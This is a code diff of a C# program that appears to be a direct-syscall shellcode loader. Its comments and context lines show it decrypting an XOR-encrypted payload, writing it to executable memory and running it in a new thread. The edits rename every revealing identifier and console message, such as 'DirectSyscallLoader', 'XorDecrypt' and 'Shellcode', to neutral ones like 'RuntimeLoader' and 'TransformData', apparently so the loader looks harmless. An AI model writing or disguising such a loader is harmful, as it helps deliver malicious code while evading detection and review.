@@ -54,7 +54,7 @@ using System;
 using System.IO;
 using System.Runtime.InteropServices;
 
-namespace DirectSyscallLoader
+namespace RuntimeLoader
 {
     class Program
     {
@@ -138,7 +138,7 @@ namespace DirectSyscallLoader
         const uint THREAD_ALL_ACCESS = 0x1FFFFF;
 
         // ---- XOR decryption (same as Loader 02) ----
-        static byte[] XorDecrypt(byte[] data, byte[] key)
+        static byte[] TransformData(byte[] data, byte[] key)
         {
             byte[] result = new byte[data.Length];
             for (int i = 0; i < data.Length; i++)
@@ -202,8 +202,8 @@ namespace DirectSyscallLoader
         {
             if (args.Length < 2)
             {
-                Console.WriteLine("Direct Syscalls Shellcode Loader");
-                Console.WriteLine("Usage: syscall_loader.exe <encrypted_shellcode.bin> <xor_key_hex>");
+                Console.WriteLine("Runtime Loader");
+                Console.WriteLine("Usage: loader.exe <input.bin> <key_hex>");
                 return;
             }
 
@@ -213,8 +213,8 @@ namespace DirectSyscallLoader
             // ---- Read and decrypt shellcode ----
             byte[] encryptedShellcode = File.ReadAllBytes(encryptedPath);
             byte[] xorKey = HexToBytes(keyHex);
-            byte[] shellcode = XorDecrypt(encryptedShellcode, xorKey);
-            Console.WriteLine("[+] Shellcode decrypted: " + shellcode.Length + " bytes");
+            byte[] shellcode = TransformData(encryptedShellcode, xorKey);
+            Console.WriteLine("[+] Data decrypted: " + shellcode.Length + " bytes");
 
             // ---- Resolve NT functions dynamically ----
             // We look up each function at runtime instead of importing them statically.
@@ -270,7 +270,7 @@ namespace DirectSyscallLoader
 
             // Clear the managed copy of decrypted shellcode from memory.
             Array.Clear(shellcode, 0, shellcode.Length);
-            Console.WriteLine("[+] Shellcode written to allocated memory. Managed copy cleared.");
+            Console.WriteLine("[+] Data written to allocated memory. Managed copy cleared.");
 
             // ---- Step 3: Change memory protection to EXECUTE-READ ----
             // Now that the shellcode is written, we change the memory from
@@ -320,7 +320,7 @@ namespace DirectSyscallLoader
                 return;
             }
 
-            Console.WriteLine("[+] Thread created via direct syscall. Shellcode is running.");
+            Console.WriteLine("[+] Thread created. Code is running.");
 
             // ---- Step 5: Wait for shellcode to finish ----
             ntWait(threadHandle, false, IntPtr.Zero);
